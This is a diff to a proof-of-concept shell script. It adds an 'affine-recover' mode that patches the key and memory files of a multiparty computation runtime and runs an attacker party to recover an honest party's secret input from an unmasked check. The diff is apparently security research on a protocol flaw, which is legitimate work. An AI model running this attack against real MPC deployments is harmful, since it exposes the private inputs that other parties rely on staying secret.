@@ -157,5 +157,30 @@ case "$cmd" in
     run_players attack_affine old "${AFF_R:-7}\n" "${AFF_X:-1}\n"
     report; exit $?
     ;;
-  *) echo "usage: poc.sh {store <y> | open <baseline|mkeyonly|guess:G> | recover [g] | affine <baseline|mkeyonly|guess:G>}"; exit 2;;
+  affine-recover)
+    # Example 2 with full input recovery: recover y outright from the unmasked
+    # check while computing the masked affine output z = x*y + r. Like `recover`
+    # but on the affine program; the standalone d = y - b opening (the last
+    # nopen=1 check) is what the instrumentation inverts. arg is an optional guess
+    # offset g (default 0). Requires the runtime rebuilt with offkey_recover.py.
+    [ "${QUIET:-0}" = 1 ] || echo "== AFFINE-RECOVER (unmasked-check input recovery)  x=${AFF_X:-1}  r=64-bit uniform mask =="
+    cp "$BK"/Memory-P0 Data/Memory-P0
+    cp "$BK"/Memory-P1 Data/Memory-P1
+    cp "$BK"/MKey-1.key Data/MKey-1.key
+    pq=""; [ "${QUIET:-0}" = 1 ] && pq="--quiet"
+    python3 "$PATCHER" --data-dir "$ROOT/Data" --mkey-only $pq
+    g="${arg:-0}"
+    # P0 (honest) enters r; P1 (attacker) enters x and runs OFFKEY_RECOVER=1.
+    run_players attack_affine_recover old "${AFF_R:-7}\n" "${AFF_X:-1}\n" "OFFKEY_RECOVER=1 OFFKEY_GUESS=$g"
+    rec=$(grep -a "OFFKEY_RECOVER " /tmp/poc_p1.log \
+            | grep -a " nopen=1 " \
+            | sed -n 's/.*recovered_y=\([0-9-]*\).*/\1/p' | tail -1)
+    if [ -n "$rec" ]; then
+      echo "  RECOVERED_Y=$rec"
+    else
+      echo "  (no recovery line; is the runtime rebuilt with offkey_recover.py? inspect /tmp/poc_p1.log)"
+      exit 1
+    fi
+    ;;
+  *) echo "usage: poc.sh {store <y> | open <baseline|mkeyonly|guess:G> | recover [g] | affine <baseline|mkeyonly|guess:G> | affine-recover [g]}"; exit 2;;
 esac
